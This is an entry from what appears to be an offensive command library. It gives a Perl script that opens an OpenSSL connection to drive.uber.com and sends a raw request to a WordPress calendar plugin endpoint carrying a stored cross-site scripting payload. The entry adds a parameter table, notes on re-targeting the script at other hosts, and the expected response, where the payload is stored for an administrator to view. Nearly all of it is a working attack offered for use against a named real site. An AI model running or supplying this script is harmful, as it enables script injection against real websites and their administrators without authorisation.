---
data: >-
  #!/usr/bin/perl

  open(NC,"|openssl s_client -connect drive.uber.com:443 -quiet") || die;

  print NC "GET
  /oh/?ai1ec_js_widget=ai1ec_agenda_widget&render=true&events_per_page=$%&xss=<svg/onload=alert(/stored-xss/.source)>\r\n";

  print NC "HTTP/1.1\r\n";

  print NC "Host: drive.uber.com\r\n";

  print NC "\r\n";

  close(NC);
tags:
  - xss
  - injection
  - http-request
type: command
executor: perl
platforms:
  - Linux
  - macOS
id: dcd6b269-3459-4ad7-b485-2bb9712ac42f
created_at: '2025-12-14T03:16:25.638Z'
updated_at: '2025-12-14T03:16:25.638Z'
verified: false
validated: true
submitted: true
---
# perl-inject-stored-xss-via-openssl

## Command

```perl
#!/usr/bin/perl
open(NC,"|openssl s_client -connect drive.uber.com:443 -quiet") || die;
print NC "GET /oh/?ai1ec_js_widget=ai1ec_agenda_widget&render=true&events_per_page=$%&xss=<svg/onload=alert(/stored-xss/.source)>\r\n";
print NC "HTTP/1.1\r\n";
print NC "Host: drive.uber.com\r\n";
print NC "\r\n";
close(NC);
```

## Description

This Perl script sends a raw, unencoded HTTPS GET request to a WordPress site's All In One Event Calendar plugin endpoint, injecting a stored XSS payload by triggering an SQL format string error. It uses OpenSSL's s_client for the HTTPS connection to bypass browser encoding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| connect | Target host and port for HTTPS (e.g., drive.uber.com:443) | Yes |
| ai1ec_js_widget | Widget type parameter (ai1ec_agenda_widget) | Yes |
| render | Enables widget rendering (true) | Yes |
| events_per_page | Malformed value to cause SQL error and inject payload ($%&xss=<svg/onload=alert(/stored-xss/.source)>) | Yes |
| Host | HTTP Host header (drive.uber.com) | Yes |

## Examples

### Basic Usage

```perl
# Save as script.pl and run: perl script.pl
```

### Advanced Usage

```perl
# Modify target in script and run for different hosts
#!/usr/bin/perl
open(NC,"|openssl s_client -connect example.com:443 -quiet") || die;
# ... rest of script
```

## Expected Output

HTTP response with 302 redirect to front page, e.g., "HTTP/1.1 302 Found\r\nLocation: https://drive.uber.com/\r\n...". No visible error; payload stored for admin view.

## Related

- [[Related Procedure|procedures/Inject-Malformed-HTTP-Request-to-Trigger-Stored-XSS]]
